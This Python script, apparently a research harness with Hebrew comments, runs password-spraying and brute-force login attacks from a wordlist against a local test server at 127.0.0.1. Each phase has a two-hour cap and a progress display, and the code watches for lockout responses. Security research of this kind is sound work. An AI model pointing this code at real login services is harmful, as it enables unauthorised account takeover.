import requests
import time
import json
import config
import sys

# הגדרות זמן גג לכל סוג תקיפה (שעתיים כל אחת)
MAX_SPRAY_TIME = 2 * 60 * 60  # 7200 שניות
MAX_BRUTE_TIME = 2 * 60 * 60  # 7200 שניות

# הגדרות קבצים
if len(sys.argv) > 1:
    LOG_FILE = sys.argv[1]
else:
    LOG_FILE = "attack_research_results.csv"

BASE_URL = "http://127.0.0.1:5000"
LOGIN_URL = f"{BASE_URL}/login"

# מונים גלובליים
current_req_index = 0
total_req_expected = 0
attack_start_time = 0


def print_progress_status(max_allowed_time):
    """הדפסת מד התקדמות מותאם לזמן שהוקצב לתקיפה הנוכחית"""
    global current_req_index, total_req_expected, attack_start_time
    elapsed = time.time() - attack_start_time

    time_percent = (elapsed / max_allowed_time) * 100

    if current_req_index > 0:
        avg_time = elapsed / current_req_index
        remaining = total_req_expected - current_req_index
        eta_min = (avg_time * remaining) / 60
    else:
        eta_min = 0

    bar_length = 20
    filled = int(bar_length * min(time_percent / 100, 1))
    bar = "█" * filled + "-" * (bar_length - filled)

    sys.stdout.write(
        f"\r[Attack Progress: |{bar}| {time_percent:.1f}%] | "
        f"Req: {current_req_index}/{total_req_expected} | "
        f"ETA: ~{eta_min:.1f} min "
    )
    sys.stdout.flush()


def perform_single_login(username, password, attack_type):
    global current_req_index
    current_req_index += 1
    start_time = time.time()

    try:
        response = requests.post(LOGIN_URL, json={"username": username, "password": password, "attack_type": attack_type}, timeout=5)
        latency = (time.time() - start_time) * 1000

        if response.status_code == 403:
            if "locked" in response.text.lower():
                return "LOCKED"

        success = (response.status_code == 200)
        # תיעוד ל-CSV
        return success
    except:
        return False


def run_password_spraying(users, wordlist_path):
    global current_req_index, total_req_expected, attack_start_time
    print(f"\n[!] Starting Password Spraying on ALL passwords...")

    attack_start_time = time.time()
    current_req_index = 0

    with open(wordlist_path, "r", encoding="utf-8", errors="ignore") as f:
        passwords = [line.strip() for line in f if line.strip()]

    total_req_expected = len(users) * len(passwords)

    for pwd in passwords:
        for user in users:
            # בדיקת זמן ספציפית ל-Spraying
            if (time.time() - attack_start_time) > MAX_SPRAY_TIME:
                print("\n[!] Spraying Timeout Reached (2 hours). Skipping rest of spray.")
                return

            print_progress_status(MAX_SPRAY_TIME)
            perform_single_login(user['username'], pwd, "password_spraying")


def run_brute_force_on_all(users, wordlist_path):
    global current_req_index, total_req_expected, attack_start_time
    print(f"\n[!] Starting Brute Force on all users...")

    attack_start_time = time.time()
    current_req_index = 0

    with open(wordlist_path, "r", encoding="utf-8", errors="ignore") as f:
        passwords = [line.strip() for line in f if line.strip()]

    total_req_expected = len(users) * len(passwords)

    for user in users:
        username = user['username']
        for pwd in passwords:
            # בדיקת זמן ספציפית ל-Brute Force
            if (time.time() - attack_start_time) > MAX_BRUTE_TIME:
                print(f"\n[!] Brute Force Timeout Reached (2 hours). Stopping.")
                return

            print_progress_status(MAX_BRUTE_TIME)
            result = perform_single_login(username, pwd, "brute_force")

            if result is True or result == "LOCKED":
                break  # עובר למשתמש הבא

if __name__ == "__main__":
    with open("users.json", "r") as f:
        all_users = json.load(f)

    wordlist_path = "test_wordlist.txt"

    run_password_spraying(all_users, wordlist_path)
    run_brute_force_on_all(all_users, wordlist_path)

    print(f"\n\n[V] Scenario {config.HASH_MODE} completed.")